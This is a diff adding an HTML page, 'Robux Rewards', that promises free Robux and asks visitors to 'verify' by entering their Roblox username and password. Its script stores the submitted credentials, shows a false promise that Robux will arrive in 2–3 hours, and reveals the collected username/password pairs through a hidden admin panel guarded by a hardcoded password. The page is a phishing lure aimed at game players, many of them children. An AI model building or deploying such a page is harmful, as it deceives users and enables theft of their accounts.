@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <title>Robux Rewards</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=Manrope:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #0aad0a;
+      --surface: #000000;
+      --surface-alt: #111111;
+      --text: #ffffff;
+      --text-dim: #a0a0a0;
+      --border: #333333;
+      --accent: #ffcc00;
+      --success: #00e600;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Manrope', system-ui, sans-serif;
+      background-color: var(--surface);
+      color: var(--text);
+      overflow-x: hidden;
+      line-height: 1.6;
+      padding: 0;
+      min-height: 100vh;
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 2rem 1rem;
+    }
+
+    h1.display {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: clamp(1.8rem, 8vw, 3.5rem);
+      font-weight: 700;
+      margin-bottom: 1rem;
+      text-align: center;
+      color: var(--text);
+      line-height: 1.2;
+    }
+
+    p.lead {
+      text-align: center;
+      color: var(--text-dim);
+      margin-bottom: 2.5rem;
+      font-size: 1.1rem;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 1.5rem;
+      margin-bottom: 2.5rem;
+    }
+
+    .card {
+      background-color: var(--surface-alt);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 1.8rem 1.5rem;
+      text-align: center;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+    }
+
+    .card:hover {
+      transform: translateY(-6px) scale(1.02);
+      border-color: var(--primary);
+    }
+
+    .card:active {
+      transform: translateY(0) scale(0.98);
+    }
+
+    .card h3 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 1.8rem;
+      margin-bottom: 0.5rem;
+      color: var(--text);
+    }
+
+    .card p {
+      color: var(--text-dim);
+      font-size: 1rem;
+      margin-bottom: 1rem;
+    }
+
+    .btn {
+      display: inline-block;
+      background-color: var(--primary);
+      color: var(--surface);
+      font-family: 'Space Grotesk', sans-serif;
+      font-weight: 600;
+      font-size: 1rem;
+      padding: 0.75rem 1.5rem;
+      border-radius: 16px;
+      border: none;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 12px rgba(10, 173, 10, 0.3);
+    }
+
+    .btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 6px 16px rgba(10, 173, 10, 0.4);
+    }
+
+    .btn:active {
+      transform: scale(0.95);
+    }
+
+    .card.vip {
+      border: 2px solid var(--accent);
+      padding-top: 3rem;
+    }
+
+    .card.vip::before {
+      content: "LIMITED OFFER!";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: var(--accent);
+      color: var(--surface);
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 0.85rem;
+      font-weight: 700;
+      padding: 0.5rem;
+      border-bottom-left-radius: 20px;
+      border-bottom-right-radius: 20px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .card.vip h3 {
+      color: var(--accent);
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .form {
+      background-color: var(--surface-alt);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 2rem;
+      margin-top: 2rem;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    }
+
+    .form-group {
+      margin-bottom: 1.2rem;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      color: var(--text-dim);
+      font-size: 0.95rem;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      max-width: 100%;
+      background-color: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 0.75rem 1rem;
+      color: var(--text);
+      font-size: 1rem;
+      transition: border 0.3s ease;
+    }
+
+    input[type="text"]:focus, input[type="password"]:focus {
+      border-color: var(--primary);
+      outline: none;
+    }
+
+    .success {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: rgba(0, 230, 0, 0.1);
+      border: 1px solid var(--success);
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin-top: 1.5rem;
+      color: var(--success);
+      font-weight: 600;
+      font-size: 1.1rem;
+      text-align: center;
+    }
+
+    .success::before {
+      content: "✓";
+      background-color: var(--success);
+      color: var(--surface);
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 10px;
+    }
+
+    .admin-box {
+      margin-top: 3rem;
+      text-align: center;
+    }
+
+    .admin-btn {
+      background: none;
+      border: 1px solid var(--border);
+      color: var(--text-dim);
+      font-size: 0.9rem;
+      padding: 0.5rem 1rem;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .admin-btn:hover {
+      background-color: var(--surface-alt);
+      color: var(--text);
+    }
+
+    .modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
+    }
+
+    .modal.show {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .modal-content {
+      background-color: var(--surface-alt);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 2rem;
+      width: 90%;
+      max-width: 500px;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+      transform: translateY(-20px);
+      transition: transform 0.3s ease;
+    }
+
+    .modal.show .modal-content {
+      transform: translateY(0);
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 998;
+      display: none;
+    }
+
+    .overlay.show {
+      display: block;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 1.6rem 1.2rem;
+      }
+
+      .card h3 {
+        font-size: 1.6rem;
+      }
+
+      .form {
+        padding: 1.5rem;
+      }
+
+      .admin-btn {
+        font-size: 0.85rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1 class="display">Get Free Robux Instantly</h1>
+    <p class="lead">Select a reward package below to begin. All offers are 100% free.</p>
+
+    <div class="grid">
+      <div class="card" data-value="1000">
+        <h3>1000 Robux</h3>
+        <p>Standard reward package</p>
+        <button class="btn">Claim Now</button>
+      </div>
+      <div class="card" data-value="10000">
+        <h3>10,000 Robux</h3>
+        <p>Enhanced reward package</p>
+        <button class="btn">Claim Now</button>
+      </div>
+      <div class="card vip" data-value="100000">
+        <h3>100,000 Robux</h3>
+        <p>Special VIP reward</p>
+        <button class="btn">Claim VIP Offer</button>
+      </div>
+    </div>
+
+    <div id="form-section" class="hidden">
+      <div class="form">
+        <h2 class="display" style="font-size: 2rem; margin-bottom: 1.5rem;">Verify Your Account</h2>
+        <p class="lead">Enter your Roblox credentials to receive Robux instantly.</p>
+        <form id="roblox-form">
+          <div class="form-group">
+            <label for="username">Roblox Username</label>
+            <input type="text" id="username" name="username" required />
+          </div>
+          <div class="form-group">
+            <label for="password">Account Password</label>
+            <input type="password" id="password" name="password" required />
+          </div>
+          <button type="submit" class="btn" style="width:100%">Submit & Claim Robux</button>
+        </form>
+        <div id="success-message" class="success hidden" style="margin-top: 1.5rem;">
+          Robux will arrive in your account within 2–3 hours.
+        </div>
+      </div>
+    </div>
+
+    <div class="admin-box">
+      <button class="admin-btn" id="admin-btn">Admin Panel</button>
+    </div>
+  </div>
+
+  <div class="overlay" id="overlay"></div>
+  <div class="modal" id="password-modal">
+    <div class="modal-content">
+      <h3 style="color: var(--text); margin-bottom: 1rem;">Enter Admin Password</h3>
+      <input type="password" id="admin-password" placeholder="Password" style="width: 100%; padding: 0.5rem; margin-bottom: 1rem; border-radius: 8px; border: 1px solid var(--border); background: var(--surface); color: var(--text);" />
+      <button class="btn" id="submit-password" style="width:100%;">Access Panel</button>
+    </div>
+  </div>
+
+  <script>
+    const cards = document.querySelectorAll('.card');
+    const formSection = document.getElementById('form-section');
+    const robloxForm = document.getElementById('roblox-form');
+    const successMessage = document.getElementById('success-message');
+    const adminBtn = document.getElementById('admin-btn');
+    const modal = document.getElementById('password-modal');
+    const overlay = document.getElementById('overlay');
+    const adminPasswordInput = document.getElementById('admin-password');
+    const submitPasswordBtn = document.getElementById('submit-password');
+
+    const submissions = [];
+    const ADMIN_PASSWORD = 'Roccow2194738';
+
+    cards.forEach(card => {
+      card.addEventListener('click', () => {
+        formSection.classList.remove('hidden');
+        window.scrollTo({
+          top: formSection.offsetTop - 100,
+          behavior: 'smooth'
+        });
+      });
+    });
+
+    robloxForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      submissions.push({ username, password });
+
+      robloxForm.reset();
+      robloxForm.classList.add('hidden');
+      successMessage.classList.remove('hidden');
+
+      playClickSound();
+    });
+
+    adminBtn.addEventListener('click', () => {
+      playClickSound();
+      modal.classList.add('show');
+      overlay.classList.add('show');
+    });
+
+    overlay.addEventListener('click', () => {
+      modal.classList.remove('show');
+      overlay.classList.remove('show');
+    });
+
+    submitPasswordBtn.addEventListener('click', () => {
+      const enteredPassword = adminPasswordInput.value;
+
+      if (enteredPassword === ADMIN_PASSWORD) {
+        playClickSound();
+        alert('Access granted.\n\nSubmissions:\n' + 
+              submissions.map(s => `- ${s.username} / ${s.password}`).join('\n') ||
+              'No submissions yet.');
+        modal.classList.remove('show');
+        overlay.classList.remove('show');
+      } else {
+        alert('Incorrect password.');
+      }
+    });
+
+    function playClickSound() {
+      const audio = new Audio("data:audio/wav;base64,//uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAGDgYtAgAyN+QWaAAihwMWm4G8QQRDiMcCBcH3Cc+CDv/7xA4Tvh9Rz/y8QADBwMWgQAZG/ILNAARQ4GLTcDeIIIhxGOBAuD7hOfBB3/94gcJ3w+o5/5eIAIAAAVwWgQAVQ2ORaIQwEMAJiDg95G4nQL7mQVWI6GwRcfsZAcsKmgAX18j8u9H8GiH6/eAQAAAK4LQIAKobHItEIYCGAExBwe8jcToF9zIKrEdDYIuP2MgOWFTQAL6+R+Xej+DSD9fvAIAAAK4LQIAKobHItEIYCGAExBwe8jcToF9zIKrEdDYIuP2MgOWFTQAL6+R+Xej+DSD9fvAIAAAK4LQIAKobHItEIYCGAExBwe8jcToF9zIKrEdDYIuP2MgOWFTQAL6+R+Xej+DSD9fvAIAAAK4LQIAKobHItEIYCGAExBwe8jcToF9zIKrEdDYIuP2MgOWFTQAL6+R+Xej+DSD9fvAIAAAK4LQIAKobHItEIYCGAExBwe8jcToF9zIKrEdDYIuP2MgOWFTQAL6+R+Xej+DSD9fvAIAAAK4LQIAKobHItEIYCGAExBwe8jcToF9zIKrEdDYIuP2MgOWFTQAL6+R+Xej+DSD9fvAIAAAK4LQIAKobHItEIYCGAExBwe8jcTof3eTgAFlukeDvAFkP7yNwAAAEw+zMAAIjIAgAIgIgA//UAAARMAZAUQEMBRAQwF9MxMAAAEwAGNIUAE8FMAAABMAAAAAAjIACACICIA//kABARABMBRAQwFEBDAUQEmQAAAmAAAJAAACQAAAEgAAASAAABIAAASABgJgAACYAIAAAAkwAAAEgAABQAAAAJgAgAAAAAAAARgAABIAAAEYAAAEQAAAAQAAAA");
+      audio.volume = 0.3;
+      audio.play().catch(e => console.log('Audio play failed:', e));
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const cardObserver = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            entry.target.style.opacity = "1";
+            entry.target.style.transform = "translateY(0)";
+          }
+        });
+      }, { threshold: 0.1 });
+
+      document.querySelectorAll('.card').forEach(card => {
+        card.style.opacity = "0";
+        card.style.transform = "translateY(20px)";
+        card.style.transition = "opacity 0.6s ease, transform 0.6s ease";
+        cardObserver.observe(card);
+      });
+    });
+  </script>
+</body>
+</html>
